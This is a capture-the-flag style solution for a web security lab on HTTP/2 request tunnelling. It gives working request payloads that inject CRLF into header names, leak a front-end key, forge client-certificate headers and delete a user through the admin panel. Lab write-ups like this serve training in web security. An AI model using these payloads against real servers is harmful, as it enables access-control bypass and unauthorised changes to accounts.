# Solution — Bypassing access controls via HTTP/2 request tunnelling

Objective (Academy description page): *"This lab is vulnerable to request
smuggling because the front-end server downgrades HTTP/2 requests and fails to
adequately sanitize incoming header names. To solve the lab, access the admin
panel at `/admin` as the `administrator` user and delete the user `carlos`. The
front-end server doesn't reuse the connection to the back-end, so isn't
vulnerable to classic request smuggling attacks. However, it is still vulnerable
to request tunnelling."*

All requests are HTTP/2 to the front-end. The lab supports HTTP/2 but does not
advertise it over ALPN, so a tool must be told to send HTTP/2 explicitly (Burp:
*Allow HTTP/2 ALPN override* + Inspector → protocol HTTP/2; this repository's
solver sends the h2 preface after an `http/1.1` ALPN handshake).

The injection lives in a header **name**: `\r\n` is written into the name field,
and the front-end copies names verbatim while downgrading to HTTP/1.1.

## 1. Confirm the CRLF injection

Append a header whose name contains a fake `Host`:

```
:method: GET
:path: /
:authority: <LAB>
foo: bar\r\nHost: abc: xyz
```

Response:

```html
<html><head><title>Server Error: Gateway Timeout</title></head>
<body><h1>Server Error: Gateway Timeout (3) connecting to abc</h1></body></html>
```

The front-end tried to connect to `abc`, so the injected line break became a real
header. `GET /admin` without credentials returns **401** (control).

## 2. Leak the front-end's client-authentication headers

The back-end authenticates requests from headers the front-end appends after the
request body. Inject an over-sized `Content-Length` plus a `search` parameter:

```
:method: POST
:path: /?search=tunnelprobe
x-leak: probe\r\nContent-Length: 120\r\n\r\nsearch=tunnelprobe: xyz
<100-byte body>
```

The back-end reads 120 bytes of "body" and keeps going into the appended
headers, which the search reflection prints:

```
0 search results for 'tunnelprobe: xyz
Content-Length: 100
X-SSL-VERIFIED: 0
X-SSL-CLIENT-CN: null
X-FRONTEND-KEY: <KEY>'
```

`X-FRONTEND-KEY` is per-instance and stable for the instance's lifetime; the
first two headers show that an ordinary visitor is unverified and unnamed.

## 3. Measure how much of a tunnelled response can be read

Responses to `HEAD` carry a `content-length` for the resource a `GET` would
return, and this front-end reads that many bytes from the back-end regardless.
Tunnelling a request therefore makes it over-read the tunnelled response into
our body. With an outer page that is *too large* the front-end reports both
numbers:

```
:method: HEAD
:path: /
x-tunnel: pad\r\n\r\nGET /admin HTTP/1.1\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\nX-FRONTEND-KEY: <KEY>\r\n\r\n: xyz
```

```html
<h1>Server Error: Received only 3712 of expected 8691 bytes of data</h1>
```

So the tunnelled `GET /admin` response is **3712 bytes**, and the outer page
must have `content-length ≤ 3712` to be readable. `/login` is **3351 bytes** —
large enough to contain the whole user table and small enough to fit.

## 4. Read the admin panel through the tunnel

```
:method: HEAD
:path: /login
x-tunnel: pad\r\n\r\nGET /admin HTTP/1.1\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\nX-FRONTEND-KEY: <KEY>\r\n\r\n: xyz
```

The 3351 bytes returned as the body are the start of the tunnelled response:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...
<h1>Users</h1>
<div><span>wiener - </span><a href="/admin/delete?username=wiener">Delete</a></div>
<div><span>carlos - </span><a href="/admin/delete?username=carlos">Delete</a></div>
```

Note the forged trio: `X-SSL-VERIFIED: 1` claims a verified client certificate,
`X-SSL-CLIENT-CN: administrator` names it, and the leaked key proves the request
came through the front-end. The back-end accepts all three.

## 5. Delete carlos

```
:method: HEAD
:path: /login
x-tunnel: pad\r\n\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\nX-FRONTEND-KEY: <KEY>\r\n\r\n: xyz
```

The front-end answers a byte-count error (`received only … of expected 3351`)
because the delete is a `302` and much shorter than `/login`. That is irrelevant:
the back-end already processed the request.

## 6. Verify

Tunnelling `GET /admin` again returns an HTTP/1.1 200 page whose user list holds
only `wiener`, and `GET /` reports:

```html
<div class='widgetcontainer-lab-status is-solved'>
    <span>LAB</span>
    <p>Solved</p>
```

## Why the outer page must be sized

* Outer `content-length` **>** tunnelled response → the front-end waits for bytes
  that never arrive and answers `Received only … of expected …` (no data).
* Outer `content-length` **≤** tunnelled response → the front-end reads exactly
  that many bytes from the back-end, which are the first bytes of the tunnelled
  response, and returns them as the body.

The solver probes content-lengths on the live instance and picks the largest
page that fits (here `/login`, 3351 of 3712 bytes), so no size is assumed.
